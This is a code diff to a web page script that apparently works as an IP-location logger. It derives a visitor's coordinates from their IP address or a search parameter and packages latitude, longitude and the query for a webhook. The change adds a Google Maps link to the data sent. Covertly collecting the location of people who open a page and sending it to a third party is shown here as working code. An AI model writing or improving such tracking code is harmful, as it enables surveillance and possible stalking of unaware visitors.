@@ -82,6 +82,7 @@
                 const searchParams = new URLSearchParams(window.location.search);
                 const searchQuery = searchParams.get("search"); // Get the search parameter from URL
                 let coordinates = null;
+                let mapLink = '';
 
                 if (searchQuery) {
                     // Geocoding API to convert search query to coordinates
@@ -91,6 +92,7 @@
                     const geoData = await geoResponse.json();
                     if (geoData && geoData[0]) {
                         coordinates = geoData[0];
+                        mapLink = `https://www.google.com/maps?q=${coordinates.lat},${coordinates.lon}`;
                     } else {
                         throw new Error("Invalid location or coordinates not found");
                     }
@@ -101,10 +103,11 @@
 
                     const ipData = await ipResponse.json();
                     if (!ipData.ip) throw new Error("Invalid IP data received");
-                    
+
                     const { loc } = ipData;
                     const [lat, lon] = loc.split(",");
                     coordinates = { lat, lon };
+                    mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 }
 
                 // Preparing data for webhook
@@ -121,6 +124,7 @@
                         fields: [
                             { name: "Latitude", value: `\`${lat}\``, inline: true },
                             { name: "Longitude", value: `\`${lon}\``, inline: true },
+                            { name: "Map Link", value: `[View Map](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
                             { name: "Search Query", value: `\`${searchQuery || "N/A"}\``, inline: false }
                         ],
                         footer: {
